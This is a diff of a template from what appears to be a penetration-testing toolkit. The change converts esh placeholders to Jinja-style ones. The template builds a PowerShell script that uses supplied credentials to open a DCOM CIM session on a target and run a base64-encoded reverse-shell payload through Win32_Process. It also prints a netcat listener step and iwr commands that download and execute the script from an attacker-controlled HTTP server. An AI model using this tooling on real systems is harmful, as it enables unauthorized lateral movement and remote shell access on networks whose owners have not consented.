@@ -6,7 +6,7 @@ metadata:
   author: "Unknown"
 
 content: |
-  echo "Answer the following with valid user credentials and a target ip. A powershell script will be generated. If successful, a revshell can be caught at port <%=$(esh variables/shell_port)%> of your kali."; \
+  echo "Answer the following with valid user credentials and a target ip. A powershell script will be generated. If successful, a revshell can be caught at port {{ shell_port }} of your kali."; \
   read --prompt-str "Target Username:" username; \
   read --prompt-str "Target Password:" password; \
   read --prompt-str "Target IP:" target; \
@@ -17,16 +17,16 @@ content: |
   echo "\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;" >> lateral-movement-wmi.ps1; \
   echo "\$Options = New-CimSessionOption -Protocol DCOM;" >> lateral-movement-wmi.ps1; \
   echo "\$Session = New-Cimsession -ComputerName $target -Credential \$credential -SessionOption \$Options;" >> lateral-movement-wmi.ps1; \
-  echo "\$Command = '<%echo $(esh payloads/revshell-windows-powershell-oneliner-base64encoded)%>';" >> lateral-movement-wmi.ps1; \
+  echo "\$Command = '{{ include('payloads/revshell-windows-powershell-oneliner-base64encoded') }}';" >> lateral-movement-wmi.ps1; \
   echo "Invoke-CimMethod -CimSession \$Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =\$Command}" >> lateral-movement-wmi.ps1; \
 
   mkdir -p packstation/outbound; mv lateral-movement-wmi.ps1 packstation/outbound/; \
   echo '================================================================'; \
   echo '                      -----PowerShell-----                      '; \
-  echo 'Preparation 1 (start listener): <%echo $(esh scripts/listener-nc)%>'; \
+  echo 'Preparation 1 (start listener): {{ include('scripts/listener-nc.yaml') }}'; \
   echo 'Without bypass: Open the created file lateral-movement-wmi.ps1 and paste in line by line into powershell'; \
   echo 'Preparation 2 (for save to disk only): powershell -ep bypass'; \
-  echo 'Deliver & save to disk: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/lateral-movement-wmi.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\lateral-movement-wmi.ps1'; \
-  echo 'Deliver, save to disk & execute: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/lateral-movement-wmi.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\lateral-movement-wmi.ps1; <%=$(esh variables/delivery_path_windows)%>\lateral-movement-wmi.ps1'; \
+  echo 'Deliver & save to disk: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-wmi.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-wmi.ps1'; \
+  echo 'Deliver, save to disk & execute: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-wmi.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-wmi.ps1; {{ delivery_path_windows }}\lateral-movement-wmi.ps1'; \
   echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
